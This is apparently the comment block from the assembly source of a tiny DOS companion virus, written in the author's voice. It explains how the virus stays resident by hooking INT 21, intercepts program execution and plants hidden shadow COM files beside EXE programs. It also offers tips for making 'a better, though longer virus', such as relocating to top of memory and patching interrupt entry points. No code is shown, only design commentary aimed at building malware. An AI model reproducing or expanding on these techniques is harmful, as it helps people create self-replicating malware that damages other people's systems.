;THE FOLLOWING CODE MAKES THE VIRUS GO RESIDENT. TO KEEP THE INFECTION
;CODE AS SHORT AS POSSIBLE, THE INT 21 VECTOR (4 BYTES) IS SAVED OUTSIDE
;THE VIRUS BODY. THIS MAY OCCASIONALLY CAUSE THE VECTOR TO BE OVERWRITTEN
;BY THE ENVIRONMENT, WHICH WILL CRASH THE SYSTEM. TO PREVENT THIS, DEFINE
;TWO WORDS FOR THE LABEL INT21 AND ADD FOUR BYTES TO THE RESIDENT CODE.
;THE FIRST TIME THAT AN "INFECTED" FILE IS RUN, IT WILL SIMPLY RETURN TO
;DOS. THIS IS BECAUSE THE RESIDENT CODE MUST FIRST BE LOADED. AFTER THAT
;EVERYTHING WILL APPEAR TO WORK NORMALLY. TO REMEDY THIS PROBLEM, ALTER
;THE MEMORY CONTROL BLOCK TO TRAP THE RESIDENT CODE, THEN JUMP TO IT. A
;STILL BETTER SOLUTION IS TO COPY THE VIRUS TO THE TOP OF MEMORY AND
;TRAP IT THERE. ALSO, DO NOT REVECTOR INTERRUPT BUT OVERWRITE THE
;ENTRY POINT WITH A FAR JUMP TO THE VIRUS AND THEN RESTORE IT. THESE
;TECHNIQUES WILL MAKE A BETTER, THOUGH LONGER VIRUS.

;THIS IS THE ACTUAL INFECTION CODE. IT CHECKS FOR THE EXEC FUNCTION THEN
;TRIES TO RUN THE PROCESS AS AN EXE. IF THIS FAILS, THE VIRUS KNOWS THAT
;IT REALLY WAS A COM PROGRAM, IN WHICH CASE IT SIMPLY LETS THE CALL GO
;THROUGH. OTHERWISE A SHADOW COM FILE IS (RE)CREATED, "INFECTING" THE
;EXE. THE HIDDEN ATTRIBUTE IS SET ON THE SHADOW FILE. TO KEEP THESE FILES
;VISIBLE, SET CX TO 0 INSTEAD OF 2.
;NOTE: UNDER DOS 5.0, REGISTERS ES AND DS ARE SAME WHEN THE EXEC CALL
;IS ISSUED. SETTING ES TO DS IS ONLY NECESSARY TO MAKE THE VIRUS RUN UNDER
;DOS 3.X. OTHERWISE YOU CAN ELIMINATE THESE INSTRUCTIOS, BRINGING THE VIRUS
;BACK TO JUST 79 BYTES.
